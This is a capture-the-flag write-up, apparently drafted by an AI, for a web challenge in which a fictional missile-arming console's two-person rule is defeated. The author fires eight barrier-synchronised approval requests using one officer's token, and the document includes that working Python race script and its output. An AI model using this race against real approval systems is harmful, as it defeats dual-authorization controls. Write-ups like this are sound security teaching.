# Two-Key Turn

**Author:** mar

**Web** · 200 pts (easy)

**TL;DR.** The console enforces the two-person rule with a check-then-insert: it verifies that the
approving officer is *distinct* from the ones already on the order, then writes the approval record.
Eight concurrent `POST /orders/AO-7D31C9/approve` requests with the single VEGA-7 key all pass the
check before any of them commits, so two approvals land — both attributed to VEGA-7 — the order
goes to `ARMED`, and its `arming_authorization` is the flag.

## Solve

**Reconnaissance.** The API describes itself at `GET /schema`; the state-changing route is
`POST /orders/{id}/approve`, and `GET /orders/{id}` returns the whole object — order id and
ref, battery, designation, `status`, `approvals` / `required_approvals`, `retry_after_ms`,
`approval_epoch`, the `approval_records` list, and `arming_authorization`. The target order is:

```
AO-7D31C9   FO-38B7A1   Coastal Battery 3 (Saltmarsh)
designation: Counter-battery release, hostile SSM launcher (grid withheld)
status: PENDING_AUTHORIZATION   required_approvals: 2
```

`arming_authorization` is the authorization document, and it is what the task asks for once the
order is `ARMED`. The console is explicit that the two approvers must be distinct officers; we hold
one officer's key (`VEGA-7`), so any sequential attempt is a non-starter — the second approval is
the same officer and the distinctness check rejects it. The only way through is to have two
approvals **in flight at the same time**, before either is visible to the other's check.

**The race.** `race9108.py` fires eight barrier-synchronised approvals, each on its own connection
(its own `requests.Session`, `Connection: close`, so no keep-alive serialisation):

```python
import threading, requests

BASE = "http://<assigned-host>:<port>"
TOK  = "opk_vega7_2f4b9c17e0a3"
OID  = "AO-7D31C9"
N    = 8

barrier = threading.Barrier(N + 1)
results = [None] * N

def worker(i):
    with requests.Session() as s:
        barrier.wait()
        r = s.post(f"{BASE}/orders/{OID}/approve",
                   headers={"Authorization": f"Bearer {TOK}", "Connection": "close"},
                   timeout=15)
        results[i] = (r.status_code, r.text[:400])

ts = [threading.Thread(target=worker, args=(i,)) for i in range(N)]
for t in ts: t.start()
barrier.wait()          # release all eight at once
for t in ts: t.join()
```

The barrier is the point of the script: it releases all eight at once, so none of the checks can
see a committed record from a peer that started earlier.

**Result.** The order re-read straight after the burst:

```json
{
  "id": "AO-7D31C9",
  "status": "ARMED",
  "approvals": 2,
  "required_approvals": 2,
  "retry_after_ms": null,
  "approval_epoch": 3,
  "approval_records": [
    {"record_id": "APR-3-3", "officer": "VEGA-7", "epoch": 3},
    {"record_id": "APR-3-4", "officer": "VEGA-7", "epoch": 3}
  ],
  "arming_authorization": "CSCTF{8FHBySNQWzYpGPyo4OYBFZMQ}"
}
```

Both records share epoch 3, which is the tell: both checks evaluated the order before either record
was committed. The distinctness rule was never violated in the database — it was violated once,
concurrently, in the window between the check and the insert.

**Dead ends.**

- **Sequential approvals with the same key.** The second request is the same officer, so the
  distinctness check refuses it; repetition just burns attempts. The two-person rule is sound
  against a single credential used serially — it is the concurrency that breaks it.
- **One request at a time with retries / backoff.** Same reason. `retry_after_ms` is null even on
  the armed order, so the console never signals that a second approval is pending.
- **Looking for a separate authorization document.** The order is the only object the key exposes;
  `arming_authorization` is a field on it, so there is nothing else to fetch.
- **Looking for a second officer's key.** The briefing says the insider holds one officer's
  credentials, and the console is scoped to that key; the race is the intended path, not credential
  theft.

**Flag:** `CSCTF{8FHBySNQWzYpGPyo4OYBFZMQ}`

Run [the solver](race9108.py) against a fresh instance; it prints the pre-state, every thread's
status, and the post-state including `arming_authorization`. Set `BASE` to your assigned instance.
The captured order state from the accepted run is in [armed9108.json](armed9108.json).

*AI: Hermes (DeepSeek 4.1 Flash) wrote this up from the team's script and the saved order state; the
race and the accepted flag are the team's, not a reconstruction.*
